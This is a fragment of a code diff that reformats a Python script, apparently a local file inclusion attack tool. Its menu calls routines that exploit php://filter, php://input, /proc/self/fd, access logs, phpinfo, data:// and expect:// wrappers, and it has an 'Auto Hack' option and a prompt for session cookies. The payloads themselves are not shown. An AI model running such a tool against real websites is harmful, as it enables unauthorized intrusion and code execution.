+            "\n[*] Trying to get some pages' content using php://filter on '%s'.."
+            % ahurl,
+            "yellow",
+        )
+    )
     run_phpfilter()
 
 
@@ -1896,7 +2362,7 @@ banner()
 check_for_update()
 time.sleep(0.5)
 choice = "4"
-validChoice = (choice == int("1") or choice == int("2") or choice == "x")
+validChoice = choice == int("1") or choice == int("2") or choice == "x"
 
 while validChoice is False:
     print("--------------------")
@@ -1911,9 +2377,10 @@ while validChoice is False:
     if choice == int("1") or choice == int("2"):
         validChoice = True
         input_cookie = input(
-            "\n[*] Enter cookies if needed (ex: 'PHPSESSID=12345;par=something') [just enter if none] -> ")
+            "\n[*] Enter cookies if needed (ex: 'PHPSESSID=12345;par=something') [just enter if none] -> "
+        )
         if len(input_cookie) > 0:
-            gen_headers['Cookie'] = input_cookie
+            gen_headers["Cookie"] = input_cookie
             # gen_headers['Cookie'] = "security=low; PHPSESSID=n3o05a33llklde1r2upt98r1k2"
 
     if choice == int("2") or choice == "2":
@@ -1947,26 +2414,36 @@ while validChoice is False:
             elif echoice == int("3") or echoice == "3":
                 printChoice("php://input wrapper")
                 run_phpinput()
-                print("\n[-] This website is not vulnerable to the php://input injection attack.\n")
+                print(
+                    "\n[-] This website is not vulnerable to the php://input injection attack.\n"
+                )
             elif echoice == int("4") or echoice == "4":
                 printChoice("/proc/self/fd")
                 run_self_fd()
-                print("\n[!] This website is not vulnerable to the /proc/self/fd attack!\n")
+                print(
+                    "\n[!] This website is not vulnerable to the /proc/self/fd attack!\n"
+                )
             elif echoice == int("5") or echoice == "5":
                 printChoice("Access log")
                 run_access_log()
             elif echoice == int("6") or echoice == "6":
                 printChoice("phpinfo")
                 run_phpinfo()
-                print("\n[!] This website is not vulnerable to the phpinfo injection attack!\n")
+                print(
+                    "\n[!] This website is not vulnerable to the phpinfo injection attack!\n"
+                )
             elif echoice == int("7") or echoice == "7":
                 printChoice("data:// wrapper")
                 run_data()
-                print("\n[!] This website is not vulnerable to the data:// injection attack!\n")
+                print(
+                    "\n[!] This website is not vulnerable to the data:// injection attack!\n"
+                )
             elif echoice == int("8") or echoice == "8":
                 printChoice("expect:// wrapper")
                 run_expect()
-                print("\n[!] This website is not vulnerable to the expect:// injection attack!\n")
+                print(
+                    "\n[!] This website is not vulnerable to the expect:// injection attack!\n"
+                )
             elif echoice == int("9") or echoice == "9":
                 printChoice("Auto Hack")
                 run_autoHack()
